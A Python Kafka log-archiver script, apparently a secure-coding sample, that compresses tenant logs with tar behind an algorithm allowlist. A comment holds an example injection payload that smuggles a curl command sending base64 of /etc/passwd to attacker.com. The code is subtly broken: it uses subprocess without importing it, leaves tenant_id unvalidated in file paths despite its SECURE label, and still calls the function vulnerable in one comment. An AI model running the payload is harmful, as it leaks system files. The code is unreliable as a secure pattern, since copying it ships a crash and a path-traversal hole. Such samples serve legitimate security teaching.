import os
import json
import sqlite3
import logging
from kafka import KafkaConsumer
from datetime import datetime

# Configure logging for the Distributed Log Archiver Node
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - KafkaArchiver - %(levelname)s - %(message)s'
)
logger = logging.getLogger("KafkaLogArchiver")

DB_FILE = "archival_audit.db"
KAFKA_BROKER = "localhost:9092"
KAFKA_TOPIC = "tenant-archival-requests"
LOG_STAGING_DIR = "/var/lib/log_staging/"
ARCHIVE_DEST_DIR = "/mnt/nfs/archives/"

def setup_archival_database():
    """Initializes the local SQLite database to audit all archival operations."""
    if not os.path.exists(LOG_STAGING_DIR):
        os.makedirs(LOG_STAGING_DIR, exist_ok=True)
    if not os.path.exists(ARCHIVE_DEST_DIR):
        os.makedirs(ARCHIVE_DEST_DIR, exist_ok=True)

    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    # Audit table for tracking log archival status
    cursor.execute('''
        CREATE TABLE archival_jobs (
            job_id TEXT PRIMARY KEY,
            tenant_id TEXT NOT NULL,
            compression_algo TEXT NOT NULL,
            status TEXT NOT NULL,
            completion_time DATETIME,
            output_log TEXT
        )
    ''')
    
    # Pre-populate with some historical mock data
    mock_jobs = [
        ('job_9012', 'tenant_A', 'gzip', 'SUCCESS', '2023-10-01 12:00:00', 'Archive created successfully.'),
        ('job_9013', 'tenant_B', 'bzip2', 'FAILED', '2023-10-01 12:05:00', 'Missing source directory.')
    ]
    cursor.executemany('''
        INSERT INTO archival_jobs (job_id, tenant_id, compression_algo, status, completion_time, output_log)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', mock_jobs)
    
    conn.commit()
    conn.close()
    logger.info("Archival audit database initialized.")


def log_job_status(job_id: str, tenant_id: str, algo: str, status: str, log_output: str):
    """Records the outcome of an archival job."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(
        '''INSERT INTO archival_jobs (job_id, tenant_id, compression_algo, status, completion_time, output_log) 
           VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP, ?)''',
        (job_id, tenant_id, algo, status, log_output)
    )
    conn.commit()
    conn.close()


def compress_tenant_logs(job_id: str, tenant_id: str, algorithm: str):
    """
    SECURE: Uses an allowlist and shell=False to prevent Command Injection.
    """
    logger.info(f"Starting secure archival for tenant {tenant_id} using {algorithm}")
    
    source_dir = os.path.join(LOG_STAGING_DIR, tenant_id)
    archive_file = os.path.join(ARCHIVE_DEST_DIR, f"{tenant_id}_archive.{algorithm}")
    
    if not os.path.exists(source_dir):
        logger.error(f"Source directory missing for tenant {tenant_id}")
        log_job_status(job_id, tenant_id, algorithm, "FAILED", "Source directory not found.")
        return False
        
    # Defense-in-depth: Strict allowlist for the algorithm. 
    # This is critical because tar's '--use-compress-program' internally uses the shell, 
    # meaning Python's shell=False is not enough on its own to prevent injection here.
    allowed_algorithms = {"gzip", "bzip2", "xz", "lz4", "zstd"}
    if algorithm not in allowed_algorithms:
        logger.error(f"Invalid compression algorithm requested: {algorithm}")
        log_job_status(job_id, tenant_id, algorithm, "FAILED", "Unsupported or invalid compression algorithm.")
        return False
        
    # Commands are defined as lists of arguments. This removes shell chaining (&&)
    # at the Python execution level.
    command_args = [
        "tar",
        "-cvf", archive_file,
        f"--use-compress-program={algorithm}",
        source_dir
    ]
    
    try:
        logger.debug(f"Executing secure system compression command: {command_args}")
        
        process = subprocess.run(
            command_args,
            shell=False,  # Explicitly disabled for security
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        if process.returncode != 0:
            logger.error(f"Compression failed for job {job_id}")
            # Masking raw stderr to prevent leaking system information or command output
            log_job_status(job_id, tenant_id, algorithm, "FAILED", "Compression process encountered an error.")
            return False
            
        logger.info(f"Compression successful for job {job_id}")
        log_job_status(job_id, tenant_id, algorithm, "SUCCESS", "Archival completed successfully.")
        return True

    except FileNotFoundError as e:
        logger.error(f"Compression tool missing: {e}")
        log_job_status(job_id, tenant_id, algorithm, "ERROR", "Archival utility not found in environment.")
        return False
    except Exception as e:
        logger.error(f"Critical error during compression for job {job_id}: {e}")
        log_job_status(job_id, tenant_id, algorithm, "ERROR", "Internal system error during compression.")
        return False


def start_kafka_consumer():
    """Starts the long-running Kafka consumer loop to process archival requests."""
    setup_archival_database()
    
    try:
        consumer = KafkaConsumer(
            KAFKA_TOPIC,
            bootstrap_servers=[KAFKA_BROKER],
            group_id='log_archiver_group',
            auto_offset_reset='earliest',
            enable_auto_commit=True,
            value_deserializer=lambda x: json.loads(x.decode('utf-8'))
        )
        logger.info(f"Listening for archival requests on Kafka topic: {KAFKA_TOPIC}")
    except Exception as e:
        logger.error(f"Failed to connect to Kafka broker: {e}")
        return

    # Example Malicious Kafka Message Payload produced by an attacker:
    # {
    #   "job_id": "job_evil_99",
    #   "tenant_id": "tenant_A",
    #   "algorithm": "gzip; curl http://attacker.com/leak?data=$(cat /etc/passwd | base64); #"
    # }

    try:
        for message in consumer:
            payload = message.value
            logger.info(f"Received Kafka message: {payload}")
            
            job_id = payload.get("job_id")
            tenant_id = payload.get("tenant_id")
            algorithm = payload.get("algorithm", "gzip")
            
            if not job_id or not tenant_id:
                logger.warning("Invalid payload structure. Missing job_id or tenant_id.")
                continue
                
            # Pass the untrusted data from the Kafka stream to the vulnerable function
            compress_tenant_logs(job_id, tenant_id, algorithm)
            
    except KeyboardInterrupt:
        logger.info("Shutting down Kafka Log Archiver.")
    finally:
        consumer.close()


if __name__ == "__main__":
    start_kafka_consumer()
